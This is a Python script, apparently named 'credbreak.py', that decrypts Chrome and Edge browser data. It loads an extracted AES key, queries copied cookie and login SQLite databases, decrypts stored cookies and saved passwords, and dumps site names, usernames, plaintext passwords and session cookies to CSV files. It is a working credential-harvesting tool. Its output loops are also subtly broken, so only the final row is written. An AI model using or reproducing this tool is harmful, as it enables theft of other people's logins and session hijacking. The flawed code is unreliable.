# Chrome / Edge cookie & password decrypter 
# Should take cookie file, password file, state file
# python3 ./credbreak.py 
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key(state_path):

    with open("./chrome_key","rb") as f:
        mkey = f.read()
    print(mkey)
    return mkey
    #return win32crypt.CryptUnprotectData(key,None,None,None,0)[1]

def decrypt_data(data, key):
    try:
        ini = data[3:15]
        data = data[15:]
        cipher = AES.new(key,AES.MODE_GCM,ini)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return ""
    
def sort_cookies(key, cookie_path):
    db = sqlite3.connect(cookie_path)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies")
    with open("./exported_cookies.csv","a") as f:
        f.write("host_key,name,cookie,expires\n")
        for host_key, name, value, encrypted_value, expires_utc in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                decrypted_value = value
        f.write(host_key+","+name+","+decrypted_value+","+str(get_chrome_datetime(expires_utc)))
        f.close()

def sort_passwords(key,password_path):
    db = sqlite3.connect(password_path)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
    with open("./exported_passwords.csv","a") as f:
        f.write("Website, Username, Password\n")
        for signon_realm, username_value, password_value in cursor.fetchall():
            decrypted_value = decrypt_data(password_value, key)
        f.write(signon_realm+","+username_value+","+decrypted_value)
        f.close()

def main():
    key = get_encryption_key("./chrome_state")
    sort_cookies(key,"./google_cookies")
    sort_passwords(key,"./google_login")
main()